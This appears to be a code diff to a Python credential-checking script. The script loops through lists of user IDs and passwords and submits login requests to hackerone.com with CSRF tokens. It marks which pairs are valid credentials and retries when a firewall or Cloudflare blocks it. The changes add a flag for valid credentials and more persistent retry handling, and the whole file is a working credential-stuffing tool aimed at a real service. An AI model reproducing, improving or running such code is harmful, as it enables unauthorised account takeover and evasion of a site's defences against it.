@@ -399,6 +399,7 @@ def _exec_():
 				r3done=1+r3done
 				
 			reqdonex=False
+			valid_credits=False
 			while reqdonex==False:#:
 				try:
 					r3=requests.post(url=url3,data=bodyStr3,headers=h3)
@@ -419,10 +420,11 @@ def _exec_():
 				if 'result_code":"valid-credentials' in r3.text:	
 					vres=stx.Green+'Valid Credetnitals'+stx.RED		
 					print(st3+' :['+vres+']')
+					valid_credits=True
 				else:
 					msg=''
 					if 'invalid-credentials' in r3.text:
-						print(st3+'invalid credentials for ['+ids[counter]+':'+passwords[counter])
+						print(st3+'\n 	invalid credentials for ['+ids[counter]+':'+passwords[counter])
 						vres='invalid'
 					elif 'Retry later' in r3.text:
 						print(st3+'\n         Firewall detected us :( Retry later)  in 30 seconds ')
@@ -434,6 +436,8 @@ def _exec_():
 						print(st3+' :['+vres+']')
 
 
+			if valid_credits==False:
+				continue
 	
 			h4={"User-Agent":userAgentH,"Accept":acceptH,"Accept-Language":AcceptLanguageH,'X-CSRF-Token':csrf_value,'Content-Type':conttypeH,'Referer':'https://hackerone.com/login',	    'Cookie':hostsession}
 			loginId=ids[counter]
@@ -466,13 +470,15 @@ def _exec_():
 			
 			reqdonex=False
 			while reqdonex==False:#:
-				r5=requests.get(url=url5,headers=h5,allow_redirects=False)##,proxies=proxyDict)
-				reqdonex=True
-				if DetectCloudFlare(r5.text):
+				try:
+					r5=requests.get(url=url5,headers=h5,allow_redirects=False)##,proxies=proxyDict)
+					reqdonex=True
+					if DetectCloudFlare(r5.text):
+						reqdonex=False
+						print('Sleeping for cloud flare')
+						time.sleep(5)
+				except Exception:
 					reqdonex=False
-					print('Sleeping for cloud flare')
-					time.sleep(5)
-
 			csrf_value=extract_csrf_tok_from_json(r5.text)
 			st =   '[E]   +Requesting New Token:'
 			if '{"csrf_token":"' in r5.text:
